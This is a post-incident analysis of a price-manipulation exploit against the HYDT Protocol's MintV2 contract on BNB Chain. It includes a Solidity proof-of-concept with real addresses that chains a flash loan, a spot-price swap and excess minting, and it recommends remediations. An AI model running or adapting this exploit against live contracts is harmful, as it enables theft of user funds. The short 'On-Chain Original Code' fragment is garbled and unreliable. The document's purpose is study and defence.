# HYDT — MintV2 Price Manipulation for Excess Token Minting Analysis

| Field | Details |
|------|------|
| **Date** | 2024-10-10 |
| **Protocol** | HYDT Protocol |
| **Chain** | BNB Chain |
| **Loss** | ~5,800 USD |
| **Attacker** | (Reported by TenArmorAlert) |
| **Attack Tx** | [0xa9df1bd97cf6d4d1d58d3adfbdde719e46a1548db724c2e76b4cd4c3222f22b3](https://app.blocksec.com/explorer/tx/bsc/0xa9df1bd97cf6d4d1d58d3adfbdde719e46a1548db724c2e76b4cd4c3222f22b3) |
| **Vulnerable Contract** | [0xA2268Fcc2FE7A2Bb755FbE5A7B3Ac346ddFeDB9B](https://bscscan.com/address/0xA2268Fcc2FE7A2Bb755FbE5A7B3Ac346ddFeDB9B) (MintV2) |
| **HYDT Token** | [0x9810512Be701801954449408966c630595D0cD51](https://bscscan.com/address/0x9810512Be701801954449408966c630595D0cD51) |
| **Root Cause** | `MintV2.initialMint()` calculates HYDT mint amount using the spot price from `getReserves()` of the WBNB-USDT Pair — manipulating the reserve ratio allows excessive HYDT minting |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/HYDT_exp.sol) |

---

## 1. Vulnerability Overview

The `initialMint()` function of the HYDT Protocol's `MintV2` contract (`0xA2268F...`) calculated the BNB value using the spot price from the WBNB-USDT UniswapV2 Pair (`0x5E9011...`) to determine the HYDT mint amount. The attacker obtained an 11,000,000 USDT flash loan from a PancakeSwap V3 Pool, manipulated the BNB price by swapping USDT→WBNB, then called `initialMint()` to mint an excessive amount of HYDT. Half of the minted HYDT was swapped for USDT and the remainder exchanged for WBNB, yielding approximately 5,800 USD.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: mint amount calculated using WBNB-USDT Pair spot price
// MintV2: 0xA2268Fcc2FE7A2Bb755FbE5A7B3Ac346ddFeDB9B
function initialMint() external payable {
    // ❌ Uses current spot price from getReserves() — manipulable via flash loan
    (uint112 r0, uint112 r1,) = IUniswapV2Pair(WBNB_USDT_PAIR).getReserves();
    uint256 bnbPriceInUSDT = (r1 * 1e18) / r0;  // ❌ Spot price

    // Higher BNB price → more HYDT minted
    uint256 mintAmount = msg.value * bnbPriceInUSDT / 1e18;
    IHYDT(HYDT).mint(msg.sender, mintAmount);
}

// ✅ Correct code: use TWAP price
function initialMint() external payable {
    // ✅ Use TWAP for manipulation-resistant price
    uint256 bnbPriceInUSDT = twapOracle.consult(WBNB, 1e18, USDT);
    uint256 mintAmount = msg.value * bnbPriceInUSDT / 1e18;
    IHYDT(HYDT).mint(msg.sender, mintAmount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: HYDT_decompiled.sol
contract HYDT {
    function getReserves() external view returns (uint256) {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► PancakeSwap V3 Pool(0x92b780...).flash(attacker, 11_000_000 USDT, 0, "")
  │
  ├─[2]─► pancakeV3FlashCallback:
  │         ├─► USDT → WBNB swap (PancakeRouter)
  │         │     └─► Large USDT buy manipulates WBNB price upward
  │         ├─► WBNB.withdraw(11 BNB)
  │         └─► MintV2(0xA2268F...).initialMint{value: 11 BNB}()
  │               └─► ❌ Excessive HYDT minted using manipulated spot price
  │
  ├─[3]─► Half of minted HYDT → USDT swap (V3 Router)
  │
  ├─[4]─► Remaining HYDT → WBNB → USDT swap
  │
  ├─[5]─► Flash loan repayment: return 11,000,000 + fee USDT
  │
  └─[6]─► Total loss: ~5,800 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
address constant MintV2 = 0xA2268Fcc2FE7A2Bb755FbE5A7B3Ac346ddFeDB9B;
address constant HYDT_ADDR = 0x9810512Be701801954449408966c630595D0cD51;

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Pair_V3 pool = Uni_Pair_V3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 HYDT = IERC20(0x9810512Be701801954449408966c630595D0cD51);

    function testExploit() external {
        // [1] PancakeSwap V3 flash loan 11,000,000 USDT
        borrow_amount = 11_000_000 ether;
        pool.flash(address(this), borrow_amount, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes memory) public {
        // [2] Manipulate BNB price by swapping USDT → WBNB
        swap_token_to_token(address(USDT), address(WBNB), USDT.balanceOf(address(this)));
        WBNB.withdraw(11 ether);

        // Call MintV2: mint excessive HYDT using manipulated spot price
        (bool success,) = MintV2.call{value: 11 ether}(
            abi.encodeWithSignature("initialMint()")
        );

        // [3] Swap half of HYDT → USDT (V3)
        uint256 v3_amount = HYDT.balanceOf(address(this)) / 2;
        HYDT.approve(address(routerV3), v3_amount);
        routerV3.exactInputSingle(ExactInputSingleParams({
            tokenIn: address(HYDT),
            tokenOut: address(USDT),
            fee: 500,
            // ...
        }));

        // [4] Remaining HYDT → USDT
        swap_token_to_token(address(HYDT), address(USDT), HYDT.balanceOf(address(this)));

        // [5] Repay flash loan
        USDT.transfer(address(pool), borrow_amount + fee0);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Price Oracle Manipulation — `MintV2.initialMint()` calculates HYDT mint amount using `getReserves()` spot price from the WBNB-USDT Pair; spot price manipulation enables over-minting |
| **Attack Technique** | Spot Price Manipulation + initialMint() Exploit (flash loan used as auxiliary funding) |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | High |
| **Attack Complexity** | High |

## 6. Remediation Recommendations

1. **Use TWAP Oracle**: Replace `getReserves()` spot price with Uniswap V2 TWAP or Chainlink.
2. **Mint Amount Cap**: Limit the maximum HYDT mintable within a single transaction.
3. **Flash Loan Defense**: Implement a circuit breaker that detects mint calls following large swaps within a single transaction.
4. **Price Deviation Threshold**: Reject transactions when the oracle price deviates sharply from the previous price.

## 7. Lessons Learned

- **Danger of Spot Prices**: Prices calculated from DEX `getReserves()` are easily manipulated via flash loans.
- **Minting and Price Oracles**: The choice of price oracle during token minting determines the overall safety of the protocol.
- **Small Losses Repeat**: A 5,800 USD loss can compound into significant damage if the same pattern is exploited repeatedly.